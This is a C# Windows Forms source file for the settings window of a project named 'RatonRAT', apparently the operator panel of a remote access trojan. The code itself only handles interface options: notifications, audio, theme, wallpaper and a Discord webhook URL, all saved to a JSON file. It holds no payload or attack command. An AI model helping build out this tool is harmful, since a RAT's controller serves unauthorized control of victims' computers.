using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Newtonsoft.Json;

namespace RatonRAT
{
    public partial class Configuration : Form
    {
        private const string configFilePath = "Data/userConfig.json";
        private UserConfig userConfig;
        private bool isMouseDown = false;

        private Point mouseOffset;

        private void Config_MouseDown(object sender, MouseEventArgs e)
        {
            isMouseDown = true;
            mouseOffset = new Point(e.X, e.Y);
        }

        private void Config_MouseMove(object sender, MouseEventArgs e)
        {
            if (isMouseDown)
            {
                this.Location = new Point(this.Left + e.X - mouseOffset.X, this.Top + e.Y - mouseOffset.Y);
            }
        }

        private void Config_MouseUp(object sender, MouseEventArgs e)
        {
            isMouseDown = false;
        }

        public Configuration()
        {
            InitializeComponent();
            this.Paint += Form_Paint;
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
        }

        private void Form_Paint(object sender, PaintEventArgs e)
        {
            if (!this.DesignMode)
            {
                using (Pen pen = new Pen(Color.White, 3))
                {
                    e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                    e.Graphics.DrawPath(pen, CreateRoundPath(this.ClientRectangle, 25));
                }
            }
        }

        private static GraphicsPath CreateRoundPath(Rectangle rect, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(rect.X, rect.Y, radius, radius, 180, 90);
            path.AddArc(rect.Width - radius - 1, rect.Y, radius, radius, 270, 90);
            path.AddArc(rect.Width - radius - 1, rect.Height - radius - 1, radius, radius, 0, 90);
            path.AddArc(rect.X, rect.Height - radius - 1, radius, radius, 90, 90);
            path.CloseFigure();
            return path;
        }

        private void button5_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void listView1_DoubleClick(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                ListViewItem selectedItem = listView1.SelectedItems[0];

                if (selectedItem.Text == "Toggle Notifications")
                {
                    userConfig.notificationMute = !userConfig.notificationMute;
                    selectedItem.ImageKey = userConfig.notificationMute ? "ToggleBell2.png" : "ToggleBell.png";
                }
                else if (selectedItem.Text == "Toggle Audio")
                {
                    userConfig.audioMute = !userConfig.audioMute;
                    selectedItem.ImageKey = userConfig.audioMute ? "ToggleAudio2.png" : "ToggleAudio.png";
                }
                else if (selectedItem.Text == "Experimental light theme")
                { 
                    userConfig.darkMode = !userConfig.darkMode;
                    selectedItem.ImageKey = userConfig.darkMode ? "ToggleTheme2.png" : "ToggleTheme.png";
                }
                else if (selectedItem.Text == "Webhook")
                {
                    userConfig.webhook = !userConfig.webhook;
                    selectedItem.ImageKey = userConfig.webhook ? "ToggleDiscord2.png" : "ToggleDiscord.png";

                    if (userConfig.webhook)
                    {
                        this.WindowState = FormWindowState.Minimized;
                        string url = Interaction.InputBox("Please enter the webhook URL:", "Webhook URL", "", -1, -1);
                        if (IsValidUrl(url))
                        {
                            userConfig.URL = url;
                        }
                        else
                        {
                            MessageBox.Show("Invalid URL, please try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            userConfig.webhook = false;
                            selectedItem.ImageKey = "ToggleDiscord.png";
                        }
                    }
                }
                else if (selectedItem.Text == "Wallpaper")
                {
                    if (userConfig.wallpaper)
                    {
                        userConfig.wallpaper = false;
                        selectedItem.ImageKey = "ToggleWallpaper.png";
                    }
                    else
                    {
                        selectedItem.ImageKey = "ToggleWallpaper2.png";

                        OpenFileDialog openFileDialog = new OpenFileDialog();
                        openFileDialog.Filter = "Supported by ratonrat|*.jpg;*.jpeg;*.png;*.bmp;*.gif";

                        if (openFileDialog.ShowDialog() == DialogResult.OK)
                        {
                            string selectedFile = openFileDialog.FileName;

                            string dataFolder = Path.Combine(Application.StartupPath, "Data");

                            if (!Directory.Exists(dataFolder))
                            {
                                Directory.CreateDirectory(dataFolder);
                            }

                            string extension = Path.GetExtension(selectedFile);
                            string destinationFile = Path.Combine(dataFolder, "wallpaper" + extension);

                            File.Copy(selectedFile, destinationFile, true);
                            userConfig.wallpaper = true;
                            MessageBox.Show("Wallpaper image set", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        } else
                        {
                            return;
                        }
                    }
                }



                SaveConfig();

                if (userConfig.notificationMute || userConfig.audioMute || userConfig.darkMode || userConfig.wallpaper || userConfig.webhook)
                    Server.Classes.SFX.disable();
                else
                    Server.Classes.SFX.enable();
            }
        }


        private void Configuration_Load(object sender, EventArgs e)
        {
            this.Region = new Region(CreateRoundPath(this.ClientRectangle, 25));
            button1.Region = new Region(CreateRoundPath(button1.ClientRectangle, 10));
            button5.Region = new Region(CreateRoundPath(button5.ClientRectangle, 10));
            listView1.Region = new Region(CreateRoundPath(listView1.ClientRectangle, 10));
            this.MouseDown += Config_MouseDown;
            this.MouseMove += Config_MouseMove;
            this.MouseUp += Config_MouseUp;
            LoadConfig();
            new RatonRAT.Classes.LightMode().Apply(this);
            ListViewItem item1 = new ListViewItem("Toggle Notifications", "notifications");
            ListViewItem item2 = new ListViewItem("Toggle Audio", "audio");
            ListViewItem item3 = new ListViewItem("Experimental light theme", "mode");
            ListViewItem item4 = new ListViewItem("Wallpaper", "wallpaper");
            ListViewItem item6 = new ListViewItem("Webhook", "webhook");

            if (userConfig.notificationMute)
                item1.ImageKey = "ToggleBell2.png";
            else
                item1.ImageKey = "ToggleBell.png";

            if (userConfig.audioMute)
                item2.ImageKey = "ToggleAudio2.png";
            else
                item2.ImageKey = "ToggleAudio.png";

            if (userConfig.darkMode)
                item3.ImageKey = "ToggleTheme2.png";
            else
                item3.ImageKey = "ToggleTheme.png";
            if (userConfig.wallpaper)
                item4.ImageKey = "ToggleWallpaper2.png";
            else
                item4.ImageKey = "ToggleWallpaper.png";

            if (userConfig.webhook)
                item6.ImageKey = "ToggleDiscord2.png";
            else
                item6.ImageKey = "ToggleDiscord.png";

            listView1.Items.Add(item1);
            listView1.Items.Add(item2);
            listView1.Items.Add(item3);
            listView1.Items.Add(item4);
            listView1.Items.Add(item6);
        }

        private void LoadConfig()
        {
            if (File.Exists(configFilePath))
            {
                string json = File.ReadAllText(configFilePath);
                userConfig = JsonConvert.DeserializeObject<UserConfig>(json);
            }
            else
            {
                userConfig = new UserConfig { darkMode = false, audioMute = false, notificationMute = false, wallpaper = false, webhook = false, blackMode = false };
            }
        }

        private void SaveConfig()
        {
            if (File.Exists(configFilePath))
            {
                File.Delete(configFilePath);
            }
            string json = JsonConvert.SerializeObject(userConfig, Formatting.Indented);
            Directory.CreateDirectory(Path.GetDirectoryName(configFilePath));
            File.WriteAllText(configFilePath, json);
        }

        private class UserConfig
        {
            public bool darkMode { get; set; }
            public bool audioMute { get; set; }
            public bool notificationMute { get; set; }
            public bool wallpaper { get; set; }
            public bool blackMode { get; set; }
            public bool webhook { get; set; }
            public string URL { get; set; } 
        }

        private void button1_Click(object sender, EventArgs e)
        {
            SaveConfig();
            Application.Restart();
        }

        private bool IsValidUrl(string url)
        {
            return Uri.TryCreate(url, UriKind.Absolute, out Uri uriResult) &&
                   (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
    }
}
